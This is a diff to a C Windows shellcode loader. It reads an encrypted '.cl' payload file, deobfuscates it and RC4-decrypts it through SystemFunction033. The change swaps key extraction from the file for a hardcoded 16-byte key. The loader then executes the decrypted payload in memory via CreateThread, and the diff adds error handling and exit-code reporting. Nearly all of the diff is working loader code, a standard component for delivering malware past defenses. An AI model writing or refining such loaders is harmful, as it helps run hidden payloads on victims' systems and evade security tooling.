@@ -49,17 +49,21 @@ BOOL Rc4EncryptionViSystemFunc033(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DW
 int main(int argc, char* argv[]) {
     
     if (!(argc >= 2)) {
-        printf("[!] Please Specify Input '.ER' File To Run ... \n");
+        printf("[!] Please Specify Input '.cl' File To Run ... \n");
         return -1;
     }
 
+    // Print the file path being used
+    printf("[i] File Path: %s\n", argv[1]);
+
 	// Defining the Key
-    unsigned char _key[0x10] = { 0 };
+	BYTE _key[KEY_SIZE] = { 0xA7, 0x4E, 0x70, 0x79, 0x01, 0xB0, 0x3D, 0x74, 0x27, 0x3A, 0xED, 0xBD, 0x85, 0xB8, 0xE9, 0xA5 };
 
     printf("[i] BUFF_SIZE : [ 0x%0.4X ] - NULL_BYTES : [ 0x%0.4X ]\n", BUFF_SIZE, NULL_BYTES);
 
     HANDLE hFile = INVALID_HANDLE_VALUE, hThread = NULL;
     DWORD dwFileSize = 0, dwNumberOfBytesRead = 0;
+
     PBYTE pBuffer = NULL;
 
 	// Reading the Encrypted Payload
@@ -93,25 +97,22 @@ int main(int argc, char* argv[]) {
         return -1;
     }
     printf("[+] DONE \n");
-    printf("\t>>> Deobfuscated Payload Size : %ld \n\t>>> Deobfuscated Payload Located At : 0x%p \n", DeobfuscatedPayloadSize, DeobfuscatedPayloadBuffer);
+    printf("\t>>> Deobfuscated Payload Size : %llu \n\t>>> Deobfuscated Payload Located At : 0x%p \n", (unsigned long long)DeobfuscatedPayloadSize, DeobfuscatedPayloadBuffer);
 
-    // Extracting the Key from the payload and updating the pointer to be after the key
-    memcpy(_key, pBuffer, 0x10); // copy the first 16 bytes to _key
-    pBuffer = (PVOID)((ULONG_PTR)pBuffer + 0x10); // update pointer to be after the first 16
-    printf("[+] Pointer Updated\n");
-
-    printf("[i] Decrypting with %p\n", pBuffer);
-    printf("[i] Retrieved Key: [ ");
-    for (size_t i = 0; i < sizeof(_key); i++)
-        printf("%02X ", _key[i]);
-    printf("]\n");
-
-    DWORD dwResourceDataSize = (DWORD)(DeobfuscatedPayloadSize - 0x10);
+    //// Adjust the size to account for the 4-byte difference
+    //if (DeobfuscatedPayloadSize > 4) {
+    //    DeobfuscatedPayloadSize -= 4;
+    //} else {
+    //    printf("[!] Deobfuscated payload size is too small.\n");
+    //    return -1;
+    //}
 
     // Decrypt the payload
-    Rc4EncryptionViSystemFunc033(_key, (PBYTE)pBuffer, sizeof(_key), dwResourceDataSize);
+    if (!Rc4EncryptionViSystemFunc033(_key, DeobfuscatedPayloadBuffer, sizeof(_key), DeobfuscatedPayloadSize)) {
+        return -1;
+    }
 
-    printf("[+] Payload Decrypted at : %p\n", pBuffer);
+    printf("[+] Payload Decrypted at : %p\n", DeobfuscatedPayloadBuffer);
     printf("[$] Press <Enter> To Run ... ");
     getchar();
 
@@ -127,11 +128,25 @@ int main(int argc, char* argv[]) {
 
 	// Create a Thread to Run the Decrypted Payload
     hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExecAddress, NULL, 0, NULL);
-    if (!hThread)
-        return ReportError("CreateThread");
+    if (!hThread) {
+        ReportError("CreateThread");
+        return -1;
+    }
 
 	// Wait for the Thread to Finish
-    WaitForSingleObject(hThread, INFINITE);
+    DWORD dwWaitResult = WaitForSingleObject(hThread, INFINITE);
+    if (dwWaitResult == WAIT_FAILED) {
+        ReportError("WaitForSingleObject");
+        return -1;
+    }
+
+    // Check the exit code of the thread
+    DWORD dwExitCode = 0;
+    if (!GetExitCodeThread(hThread, &dwExitCode)) {
+        ReportError("GetExitCodeThread");
+        return -1;
+    }
+    printf("[i] Payload Thread Exit Code: %lu\n", dwExitCode);
 
     printf("[+] DONE \n");
 
